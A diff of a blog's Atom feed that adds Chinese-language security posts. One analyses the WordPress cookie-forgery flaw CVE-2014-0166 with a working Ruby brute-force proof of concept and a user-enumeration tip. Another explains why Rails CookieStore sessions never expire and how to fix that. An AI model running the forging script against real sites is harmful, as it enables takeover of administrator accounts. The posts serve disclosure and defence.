@@ -1,11 +1,11 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[Octopress Demo]]></title>
-  <link href="http://shaolin-tw.github.com/atom.xml" rel="self"/>
-  <link href="http://shaolin-tw.github.com/"/>
-  <updated>2012-05-12T03:29:33+08:00</updated>
-  <id>http://shaolin-tw.github.com/</id>
+  <title><![CDATA[Shaolin.TW]]></title>
+  <link href="http://tech.shaolin.tw/atom.xml" rel="self"/>
+  <link href="http://tech.shaolin.tw/"/>
+  <updated>2016-09-04T22:00:46+08:00</updated>
+  <id>http://tech.shaolin.tw/</id>
   <author>
     <name><![CDATA[shaolin]]></name>
     
@@ -14,11 +14,97 @@
 
   
   <entry>
-    <title type="html"><![CDATA[First-post]]></title>
-    <link href="http://shaolin-tw.github.com/blog/2012/05/11/first-post/"/>
-    <updated>2012-05-11T23:15:00+08:00</updated>
-    <id>http://shaolin-tw.github.com/blog/2012/05/11/first-post</id>
-    <content type="html"><![CDATA[<h1>程式碼測試</h1>
+    <title type="html"><![CDATA[CVE-2014-0166 Wordpress 偽造 Cookie 弱點]]></title>
+    <link href="http://tech.shaolin.tw/posts/2014/04/17/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/"/>
+    <updated>2014-04-17T02:40:00+08:00</updated>
+    <id>http://tech.shaolin.tw/posts/2014/04/17/cve-2014-0166-wordpress-forged-cookie-vulnerabilities</id>
+    <content type="html"><![CDATA[<p>本篇同步刊載於 <a href="http://devco.re/blog/2014/04/16/cve-2014-0166-wordpress-forged-cookie-vulnerabilities/">DEVCORE 官方部落格</a></p>
+
+<h1>前言</h1>
+
+<p>在一陣 OpenSSL Heartbleed 淘金潮中，又有一個技術門檻低、後果嚴重、也同樣需要些運氣的漏洞被揭發－<a href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2014-0166">CVE-2014-0166</a>。CVE-2014-0166 是 WordPress 上面驗證登入 cookie 的弱點，攻擊者可以暴力偽造出合法 cookie，藉此獲得 WordPress 最高權限，進而拿到 shell 取得系統操作權。
+讓我們來分析一下這次的弱點是發生了什麼事吧！</p>
+
+<h1>解析</h1>
+
+<p>這次出問題的程式碼在<a href="https://github.com/WordPress/WordPress/blob/684145ca8101e9ba5d9b4516709121fbe0fb9aee/wp-includes/pluggable.php#L650">這邊</a>，關鍵程式碼如下：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  $key = wp_hash($username . $pass_frag . '|' . $expiration, $scheme);
+</span><span class='line'>  $hash = hash_hmac('md5', $username . '|' . $expiration, $key);
+</span><span class='line'>
+</span><span class='line'>  if ( $hmac != $hash ) {
+</span><span class='line'>    /**
+</span><span class='line'>     * Fires if a bad authentication cookie hash is encountered.
+</span><span class='line'>     *
+</span><span class='line'>     * @since 2.7.0
+</span><span class='line'>     *
+</span><span class='line'>     * @param array $cookie_elements An array of data for the authentication cookie.
+</span><span class='line'>     */
+</span><span class='line'>    do_action( 'auth_cookie_bad_hash', $cookie_elements );
+</span><span class='line'>    return false;
+</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>問題主要發生在比較運算子 != 上面，!= 運算子是 non-strict，會在比較前先做型態轉換，所以下面看似應該是回傳 true 的例子，全部都顯示為 false，細節請參閱<a href="http://www.php.net/manual/en/language.operators.comparison.php">官方手冊</a>。</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>var_dump(0 != "a"); // 0 != 0 -&gt; false
+</span><span class='line'>var_dump("1" != "01"); // 1 != 1 -&gt; false
+</span><span class='line'>var_dump("10" != "1e1"); // 10 != 10 -&gt; false
+</span><span class='line'>var_dump(100 != "1e2"); // 100 != 100 -&gt; false
+</span><span class='line'>var_dump( "0" != "0e10123456789012345678901234567890" ); // 0 != 0 -&gt; false</span></code></pre></td></tr></table></div></figure>
+
+
+<p>進入正題，WordPress 認證身分用的 cookie 內容是這樣的：『username|expiration|hmac』。
+username 是使用者名稱，
+expiration 是有效期限(timestamp)，
+hmac 值用來驗證 cookie 是否合法。
+從上面程式碼可以看到，hmac 的算法是經過 username、pass_frag、expiration、key 綜合得出。若有辦法控制 cookie 中的 hmac 使伺服器認為該 cookie 合法，就可以成功偽造成 username。</p>
+
+<p>利用稍早提到的比較運算子問題，若我們讓 cookie 中的 hmac 值為 0，很有可能讓判斷式變成下面這樣：</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>//if ( $hmac != $hash ) {
+</span><span class='line'>  if ( "0" != "0e10123456789012345678901234567890" ) {
+</span><span class='line'>    do_action( 'auth_cookie_bad_hash', $cookie_elements );
+</span><span class='line'>    return false;
+</span><span class='line'>  }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>如此便可以通過驗證，成功偽造合法 cookie。
+而為了讓 $hash == 0，可以不斷改變 cookie 中的 expiration，讓產生的 MD5 值($hash)經過型態轉換後剛好變成 0。
+符合 $hash == 0 的 MD5 $hash 值有
+0eXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX、00eXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&hellip;.000000000000000000000000000eX、00000000000000000000000000000 (X = 0,1,2,3,4,5,6,7,8,9)</p>
+
+<p>故出現 $hash == 0 的機率為 Sum(10<sup>n</sup>,n=0,30)/16<sup>32</sup> = 3.265262085617465e-09</p>
+
+<p>每次偽造的成功機率約為三億分之一，並不會很高，但已經足夠在一個月內拿到最高權限，而且所耗成本並不會很高。</p>
+
+<h1>實驗</h1>
+
+<p>為了驗證此方法之可行性，我們架設了 <a href="http://tw.WordPress.org/WordPress-3.8.1-zh_TW.zip">WordPress 3.8.1</a> 環境。並且寫程式將登入 cookie 中的 hmac 設為 0，不斷調整 expiration 值測試是否已經登入，程式如下：</p>
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -31,19 +117,742 @@
 <span class='line-number'>9</span>
 <span class='line-number'>10</span>
 <span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="c1"># Output &quot;I love Ruby&quot;</span>
-</span><span class='line'><span class="n">say</span> <span class="o">=</span> <span class="s2">&quot;I love Ruby&quot;</span>
-</span><span class='line'><span class="nb">puts</span> <span class="n">say</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;httpclient&#39;</span>
 </span><span class='line'>
-</span><span class='line'><span class="c1"># Output &quot;I *LOVE* RUBY&quot;</span>
-</span><span class='line'><span class="n">say</span><span class="o">[</span><span class="s1">&#39;love&#39;</span><span class="o">]</span> <span class="o">=</span> <span class="s2">&quot;*love*&quot;</span>
-</span><span class='line'><span class="nb">puts</span> <span class="n">say</span><span class="o">.</span><span class="n">upcase</span>
+</span><span class='line'><span class="n">http</span> <span class="o">=</span> <span class="no">HTTPClient</span><span class="o">.</span><span class="n">new</span>
 </span><span class='line'>
-</span><span class='line'><span class="c1"># Output &quot;I *love* Ruby&quot;</span>
-</span><span class='line'><span class="c1"># five times</span>
-</span><span class='line'><span class="mi">5</span><span class="o">.</span><span class="n">times</span> <span class="p">{</span> <span class="nb">puts</span> <span class="n">say</span> <span class="p">}</span>
+</span><span class='line'><span class="n">cookie_name</span> <span class="o">=</span> <span class="s2">&quot;wordpress_logged_in_de5be3cf9fcea023a1303527e10ea67a&quot;</span>
+</span><span class='line'><span class="n">timestamp</span> <span class="o">=</span> <span class="no">Time</span><span class="o">.</span><span class="n">now</span><span class="o">.</span><span class="n">to_i</span>
+</span><span class='line'>
+</span><span class='line'><span class="p">(</span><span class="n">timestamp</span><span class="o">.</span><span class="n">.timestamp</span><span class="o">+</span><span class="mi">800000000</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">time</span><span class="o">|</span>
+</span><span class='line'>  <span class="n">result</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;http://domain.my/wordpress/&#39;</span><span class="p">,</span> <span class="kp">nil</span><span class="p">,</span> <span class="p">{</span><span class="s2">&quot;Cookie&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;</span><span class="si">#{</span><span class="n">cookie_name</span><span class="si">}</span><span class="s2">=admin%7C</span><span class="si">#{</span><span class="n">time</span><span class="si">}</span><span class="s2">%7C0&quot;</span><span class="p">})</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">include?</span> <span class="s1">&#39;logout&#39;</span>
+</span><span class='line'>    <span class="nb">puts</span> <span class="s2">&quot;admin%7C</span><span class="si">#{</span><span class="n">time</span><span class="si">}</span><span class="s2">%7C0&quot;</span>
+</span><span class='line'>    <span class="k">break</span>
+</span><span class='line'>  <span class="k">end</span>
+</span><span class='line'><span class="k">end</span>
 </span></code></pre></td></tr></table></div></figure>
 
+
+<blockquote><p>註：此程式為 POC，請自行調整為多執行緒版本，不然速度會很慢。</p></blockquote>
+
+<p>經過一段長時間的等待，得到的結果如下：</p>
+
+<p><img src="http://user-image.logdown.io/user/264/blog/264/post/194450/3vMz5Z9TSHuI64JSBuTJ_iTerm.png" alt="暴力偽造 cookie，直到成功登入" /></p>
+
+<p>得知當 cookie 中的 username 為 admin 且 expiration 值為 1421818232 時，伺服器算出來的 hmac 經過型態轉換會變成 0。我們將測試成功的 cookie 值： admin%7C1421818232%7C0 貼到瀏覽器上。成功變成 admin 如下圖，實驗成功！</p>
+
+<p><img src="http://user-image.logdown.io/user/264/blog/264/post/194450/CxW0WmeoTUWclfBVISgZ_Mantra1.png" alt="利用偽造的 cookie 登入 WordPress" /></p>
+
+<blockquote><p>註：一般狀況，若不知道 WordPress 最高權限的帳號，可以利用 WordPress 的 feature 在 <a href="http://your.WordPress.com/?author=$id">http://your.WordPress.com/?author=$id</a> ($id: 1,2,3,4&hellip;,999,&hellip;) 頁面中列舉所有使用者帳號。通常 $id = 1 的 author 都有 WordPress 的管理權限。</p></blockquote>
+
+<h1>結論</h1>
+
+<p>最近出現了一個高風險通報 CVE-2014-0166，其中提及 WordPress 在舊版驗證 cookie 的部分出現弱點，可以偽造合法 cookie，進而取得 WordPress 管理權限。本文分析了其原理，並且證實之。</p>
+
+<p>對於攻擊者而言，雖然每次偽造 cookie 成功的機率約為三億分之一並不高，但發送三億個 request 後或許能拿到最高權限，已經是值得投資的級數。</p>
+
+<p>對於 WordPress 管理者而言，建議立即更新至 3.8.2 以後版本，以免受到此風險攻擊。</p>
+
+<p>從此事件也提醒了 PHP 開發者，在撰寫重要的驗證行為，要特別注意 PHP 比較運算子的特性，請使用 === (不等於請用 !==)來保證等式左右型態與值為一樣，避免因為轉型造成的資安風險。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Rails CookieStore 的安全議題]]></title>
+    <link href="http://tech.shaolin.tw/posts/2013/12/17/security-issue-of-rails-cookiestore-mechanism/"/>
+    <updated>2013-12-17T01:25:00+08:00</updated>
+    <id>http://tech.shaolin.tw/posts/2013/12/17/security-issue-of-rails-cookiestore-mechanism</id>
+    <content type="html"><![CDATA[<h1>前言</h1>
+
+<p>上週在 <a href="http://exp.tw/writing/show/52">exp.tw</a> 上面看到 <a href="https://blog.whitehatsec.com/">WhiteHat Security</a> 公布本年度最新、最有創意的 web 攻擊手法<a href="https://blog.whitehatsec.com/top-10-web-hacking-techniques-2013/">候選名單</a>。曾經我也寫過一陣子 Rails ，所以在清單中看到有一條關於 Ruby on Rails 的議題稍感興趣，這個風險叫做「Ruby on Rails Session Termination Design Flaw」，投稿的文章<a href="http://maverickblogging.com/logout-is-broken-by-default-ruby-on-rails-web-applications/">在此</a>。</p>
+
+<p>此風險是關於 Rails 的 session 儲存機制。Rails 預設的 session 值是存在 cookie 裡面，即 ActionDispatch::Session::CookieStore，該投稿文章提到 session 如果使用預設的 CookieStore 機制，產生的 session cookie 永不失效，即使登出後產生了新的 session cookie，舊有的 session cookie 仍然可以拿來作為認證用途。直接拿本站 logdown 平台當範例說明，如下面影片：</p>
+
+<center><iframe width="640" height="480" src="//www.youtube.com/embed/DaNiRegLek8?rel=0" frameborder="0" allowfullscreen></iframe></center>
+
+
+<p>這有什麼樣的風險呢？這個風險在於，只要你有一次在不安全的網路環境中被偷走 session cookie，即使你登出了，別人還是可以利用那組 session cookie 盜用你的身分。就好像你家裡鑰匙被偷走了，不管如何換門鎖，別人還是可以自由進出你家。</p>
+
+<p>台灣有一半以上 RoR 網站使用 CookieStore 做為 session 存儲方式（全世界也是啦！），所以這個問題值得提一下，本篇就來探討為什麼會有這樣的狀況，以及如何解決這樣的問題。</p>
+
+<h1>原理</h1>
+
+<h2>CookieStore 的儲存機制</h2>
+
+<p>在開始解說原理之前，我們先要了解 CookieStore 機制到底在 session cookie 裡面存了什麼東西？我們先建立一個乾淨的 rails 環境，然後我們在程式裡面加上 session 值， key 叫做 secret 好了。</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="n">session</span><span class="o">[</span><span class="ss">:secret</span><span class="o">]</span> <span class="o">=</span> <span class="s1">&#39;very secret&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>瀏覽網頁後抓到的 session cookie 可能像這樣：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiJWNiMDhiMDIyNmM5MzFkNTY1NDcw</span><span class="p">\</span><span class="n">nMWY5ZmJmOTNkZDM0BjsAVEkiC3NlY3JldAY7AEZJIhB2ZXJ5IHNlY3JldAY7</span><span class="p">\</span><span class="n">nAFQ</span><span class="o">%</span><span class="mi">3</span><span class="n">D</span><span class="o">--</span><span class="n">bfdd96e1d5157520226a160c571ab75a7342d8ee</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>這個 cookie 分成兩部分，分別用 &ldquo;&ndash;&rdquo; 符號區隔。前半部分是用 base64 編碼過後的 ruby 序列化物件，後半部是 HMAC，用來驗證前半部是不是合法的。試著解碼前半部份如下：</p>
+
+<p><img src="http://user-image.logdown.io/user/264/blog/264/post/166819/JWx6D9cQmOOONPzarkwQ_decode_cookie.png" alt="decode_cookie.png" /></p>
+
+<p>可以看到解出來有一個 session_id ，另一個就是我們之前在程式裡面加的 secret。</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span><span class="s2">&quot;session_id&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;cb08b0226c931d5654701f9fbf93dd34&quot;</span><span class="p">,</span> <span class="s2">&quot;secret&quot;</span><span class="o">=&gt;</span><span class="s2">&quot;very secret&quot;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>由此可以看到，CookieStore 的儲存機制會把所有的 session 值放到 client 端的 cookie 裡面，所以 <a href="http://guides.rubyonrails.org/security.html#session-storage">rails 官方安全說明文件</a>也不斷提醒，如果使用 CookieStore 做為儲存 session 的方式，絕對不要存私密的東西，因為它僅用 base64 編碼而非加密。不過，即使 session 的內容能被解碼看似很不安全，但其實這個 session 值並不能輕易的被改變，因為有後半部的 HMAC 驗證，它會將前半部的值跟 server 端的 secret_token 做 SHA1 運算，如果前半部改變，後半部的 SHA1 值也不會對，使驗證失敗。</p>
+
+<p>這裡又牽扯到另外一個問題，去年大概十二月出了一篇文章「 <a href="http://phenoelit.org/blog/archives/2012/12/21/let_me_github_that_for_you/index.html">Let Me Github That For You</a>」，提到目前有許多公開的 rails 專案把程式碼放在 github 上，其中包含了剛剛說的 secret_token，也就是說如果有了這個 secret_token，我們便可以自行偽造 session 值。</p>
+
+<p>目前 Rails 4 之後已經預設會對 session cookie 加密，要看到 session 值已經沒有這麼容易了，但如果 secret_token.rb 還是放在公開的空間例如: Github，還是可以解開的。此外，本篇主要講的安全議題並不會受 Rails 4 這個機制影響。</p>
+
+<p>對了，如果你看到 rails 網站的 session cookie 裡面含有 &ldquo;&ndash;&rdquo; 這個符號，可以用下面方式來解碼：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="no">Marshal</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="no">Base64</span><span class="o">.</span><span class="n">decode64</span><span class="p">(</span><span class="n">session_cookie</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;--&quot;</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">))</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>問題出在使用者的認證方式</h2>
+
+<p>說到 Rails 的會員和認證，通常會有比較多人使用 <a href="https://github.com/plataformatec/devise">Devise</a> 這個 gem 來幫忙處理，我們就拿 Devise 做一個測試站台來當做範例，分別來看看已登入的 cookie 和登出再登入的 cookie 有什麼不同。</p>
+
+<p>以下是第一次登入時的 session cookie 值（已解碼）：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span> <span class="s2">&quot;session_id&quot;</span>           <span class="o">=&gt;</span> <span class="s2">&quot;088e4032f9579e118438dac62106bc1f&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="s2">&quot;warden.user.user.key&quot;</span> <span class="o">=&gt;</span> <span class="o">[[</span><span class="mi">1</span><span class="o">]</span><span class="p">,</span> <span class="s2">&quot;$2a$10$QrArbqRt.h7lW.tk6iKZie&quot;</span><span class="o">]</span><span class="p">,</span>
+</span><span class='line'>  <span class="s2">&quot;_csrf_token&quot;</span>          <span class="o">=&gt;</span> <span class="s2">&quot;mau7U+XrCOGTUtDSbx9RIMjFJLdxjK0cZ4DZGmfgozQ=&quot;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>以下是登出當下的 session cookie 值（已解碼）：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span> <span class="s2">&quot;flash&quot;</span>      <span class="o">=&gt;</span> <span class="c1">#&lt;ActionDispatch::Flash::FlashHash:0x007fe2ec66f6d0 @used=#&lt;Set: {}&gt;, </span>
+</span><span class='line'>                   <span class="vi">@closed</span><span class="o">=</span><span class="kp">false</span><span class="p">,</span> <span class="vi">@flashes</span><span class="o">=</span><span class="p">{</span><span class="ss">:notice</span><span class="o">=&gt;</span><span class="s2">&quot;Signed out successfully.&quot;</span><span class="p">},</span>
+</span><span class='line'>                   <span class="vi">@now</span><span class="o">=</span><span class="kp">nil</span><span class="o">&gt;</span><span class="p">,</span>
+</span><span class='line'>  <span class="s2">&quot;session_id&quot;</span> <span class="o">=&gt;</span> <span class="s2">&quot;503c5adb9fbb06a3bc9a9af874d8377e&quot;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>以下是登出後再重新登入的 session cookie 值（已解碼）：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span> <span class="s2">&quot;session_id&quot;</span>           <span class="o">=&gt;</span> <span class="s2">&quot;503c5adb9fbb06a3bc9a9af874d8377e&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="s2">&quot;warden.user.user.key&quot;</span> <span class="o">=&gt;</span> <span class="o">[[</span><span class="mi">1</span><span class="o">]</span><span class="p">,</span> <span class="s2">&quot;$2a$10$QrArbqRt.h7lW.tk6iKZie&quot;</span><span class="o">]</span><span class="p">,</span>
+</span><span class='line'>  <span class="s2">&quot;_csrf_token&quot;</span>          <span class="o">=&gt;</span> <span class="s2">&quot;r70bOzxJlMB/pN073OUB1Uml7ZEp0gjIHo4TQbZVN8Q=&quot;</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>從上面三個可以看到兩件事情：</p>
+
+<ol>
+<li>Devise 實作登出時，是把整個 session 砍掉，重新給了一個新的 session （session_id 不一樣）</li>
+<li>用來認證的 warden.user.user.key 值在不同的兩個 session 內都一樣</li>
+</ol>
+
+
+<p>用來識別身分的值（此為 warden.user.user.key）在每次 session 中都一樣，所以不管 session 再怎麼刪去重建，因為識別的值沒有失效，永遠都可以合法通過身分驗證，這就是問題的核心點。與其說這是 rails 的問題，更貼切的說法是開發者在實作身分認證時沒有考慮到那些識別值需要有失效的時候。</p>
+
+<p>其實 <code>@current_user = User.find(session[:uid])</code> 在從前是再一般不過的寫法，因為通常 session 值都是存在 server 端，client 端只存放 session_id 用來當 server 端的 index，當 session 被清空意即所有的 session 值也一併失效。但在 CookieStore 機制下所有值都存在 client 端上，server 端很難控制這些值是不是已經永久失效，而原本的 session_id 只是中看不中用，完全沒有功用。你可能會好奇既然資料都存在 client 端，為什麼 session cookie 裡面還會有 session_id，這在<a href="http://guides.rubyonrails.org/action_controller_overview.html#session">官方文件</a>中有描述：</p>
+
+<blockquote><p>For most stores, this ID is used to look up the session data on the server, e.g. in a database table. There is one exception, and that is the default and recommended session store - the CookieStore - which stores all session data in the cookie itself (the ID is still available to you if you need it)</p></blockquote>
+
+<p>翻譯：session_id 就是擺在那邊好看的，你如果要用可以拿去用唷！揪咪 ^.＜</p>
+
+<h1>解法</h1>
+
+<p>關於解決方案，共有兩個面向，一個是使用者如何自救，讓漂流在外面的眾多 session cookie 能夠失效，免得被有心人盜用；另一個是開發者如何從 server 端來修正 CookieStore 帶來的困擾。</p>
+
+<h2>如何讓之前所有的 session cookie 失效</h2>
+
+<p>在<a href="http://maverickblogging.com/logout-is-broken-by-default-ruby-on-rails-web-applications/">原文</a>中有提到讓 session cookie 失效的方法有二，一個是使用者改密碼，另一個是變更 server 端的 secret_token。前者是因為改密碼後 <code>"warden.user.user.key" =&gt; [[1], "$2a$10$QrArbqRt.h7lW.tk6iKZie"]</code> 值會改變（以 Devise 為例），造成用原本的值認證失敗。後者是改變 secret_token 後，原本 cookie 後半部 HMAC 的部份就會因為 key 變了而驗證失敗，造成整個 cookie 失效。</p>
+
+<p>但兩種方法都不是很方便，對使用者而言，更不可能改到 secret_token。而且，改密碼這招並不一定對每個站都有效，例如我正在使用的 logdown（又中槍XD）就不會因為改變密碼而讓 session cookie 失效。</p>
+
+<p>logdown 的 session cookie 大概是這個樣子（已解碼）：</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="p">{</span> <span class="s2">&quot;session_id&quot;</span>           <span class="o">=&gt;</span> <span class="s2">&quot;234a5fe379e6fd7285c119a912bf8875&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="s2">&quot;_csrf_token&quot;</span>          <span class="o">=&gt;</span> <span class="s2">&quot;kBUbkc+uwJf2jAf2BNxen//qDnbanIWt1p66ChTZj74=&quot;</span><span class="p">,</span>
+</span><span class='line'>  <span class="s2">&quot;user_id&quot;</span>              <span class="o">=&gt;</span> <span class="c1">#&lt;OmniAuth::AuthHash credentials=#&lt;OmniAuth::AuthHash expires=true expires_at=1387100895 refresh_token=&quot;3dfdef72eb7c1f40b1b6a5f01e0a5711&quot; token=&quot;a9545433a04a0af603839bd5924a8da5&quot;&gt;</span>
+</span><span class='line'>                              <span class="n">extra</span><span class="o">=</span><span class="c1">#&lt;OmniAuth::AuthHash name=&quot;cookie_store&quot;&gt; </span>
+</span><span class='line'>                              <span class="n">info</span><span class="o">=</span><span class="c1">#&lt;OmniAuth::AuthHash::InfoHash email=nil&gt; </span>
+</span><span class='line'>                              <span class="n">provider</span><span class="o">=</span><span class="s2">&quot;logdownid&quot;</span> <span class="n">uid</span><span class="o">=</span><span class="s2">&quot;5566&quot;</span><span class="o">&gt;</span><span class="p">,</span>
+</span><span class='line'>  <span class="s2">&quot;warden.user.user.key&quot;</span> <span class="o">=&gt;</span> <span class="o">[[</span><span class="mi">5566</span><span class="o">]</span><span class="p">,</span> <span class="s2">&quot;$2a$13$W6UrdvOhr3YTyYt4S1kbSe&quot;</span><span class="o">]</span><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>實驗過後，更改密碼確實會讓 warden.user.user.key 的值有所改變，但 logdown 似乎沒有使用 Devise 的 current_user helper，猜測是直接使用 <code>@current_user = User.find(session[:user_id].uid)</code> 之類的方式抓使用者。可惡害我之前看到 warden.user.user.key 改變還可以正常登入時見獵心喜，以為是 Devise 驗證那塊出了什麼問題 QQ</p>
+
+<p>小結就是使用者要自行讓 session cookie 失效非常的麻煩，甚至有可能做不到。唯一的方法可能就是打電話給開發者拜託他們關注一下這個問題了吧 XD</p>
+
+<h2>server 端的防禦方針</h2>
+
+<p>從提供安全服務的角度來看，我們已經不能再給一份真摯的 cookie 一個一萬年的期限，否則駭客將會踏著七色的雲彩而來。給 cookie 一個有效期限，或是直接讓 cookie 生於 server、死於 server，才是解決這個問題的大方向。以下整理三點方案提供參考：</p>
+
+<ol>
+<li><p>不使用預設的 CookieStore 做為 session 儲存方式，在 <a href="http://guides.rubyonrails.org/action_controller_overview.html#session">ActionDispatch::Session</a> 裡面有其他四種儲存方式可以選擇。缺點就是需要額外的硬體支援，執行起來也沒有 CookieStore 來的快，看服務取向來 trade-off 囉！</p></li>
+<li><p>在 session cookie 裡面加入一個 timeout 值，每次進入主要程式前都先檢查傳進來的 session cookie 是否過期，如果過期該 cookie 就無效，可以參考<a href="https://www.coffeepowered.net/2013/09/26/rails-session-cookies/">這篇</a>上面的作法。缺點是這個方法靈活度不大，可能會造成使用者三不五時需要重新登入，或 cookie 在過期前仍然有被盜用的風險。</p></li>
+<li><p>既然 rails 在 session cookie 提供一個 session_id 值，我們便可以在 server 端建立一個合法 session_id 清單（存於記憶體），使用者登入時把該使用者的 session_id 存入合法清單中；登出時把該使用者的 session_id 從合法清單中移除。在進入主要程式前都先檢查使用者的 session_id 是否存在在合法清單中，如果不合法則不給予使用者權限。實作上可參考<a href="https://www.coffeepowered.net/2013/09/26/rails-session-cookies/">這篇</a>下面的部份，但還要注意這個合法清單可能會有不斷膨脹的問題。</p></li>
+</ol>
+
+
+<p>當然，減少被盜的風險（例如使用 https）也是另外一個角度的解決方案。『永遠都偷不走的 session』VS 『就算被偷也會失效的 session』XD 不過想想，無論做再多防禦，還是無法保證 session cookie 不會被偷走（直接到受害者電腦去拿防不了了吧），所以多少還是要思考一下如何在受害後降低傷害的方式。</p>
+
+<h1>結論</h1>
+
+<p>因為 rails 預設的 CookieStore session 儲存機制，以及慣用的 session 認證方式，導致任何曾經認證過的 session cookie 永遠不會失效。這個現象會讓所有曾經在不安全網路下使用部分 rails 服務的使用者，有永久被盜用的風險。</p>
+
+<p>本文透過小實驗說明這件事情發生的原因，並稍微提及其他 CookieStore 機制產生的問題。最後整理了三點方案，建議開發者要加入能夠控制 session cookie 存亡的機制，以避免這個風險。</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[神魔之塔脫機自動戰鬥]]></title>
+    <link href="http://tech.shaolin.tw/posts/2013/11/05/towerofsaviors-automatically-battle-without-phone/"/>
+    <updated>2013-11-05T05:20:00+08:00</updated>
+    <id>http://tech.shaolin.tw/posts/2013/11/05/towerofsaviors-automatically-battle-without-phone</id>
+    <content type="html"><![CDATA[<h1>前言</h1>
+
+<p>最近下載了神魔之塔這款遊戲&hellip;orz。
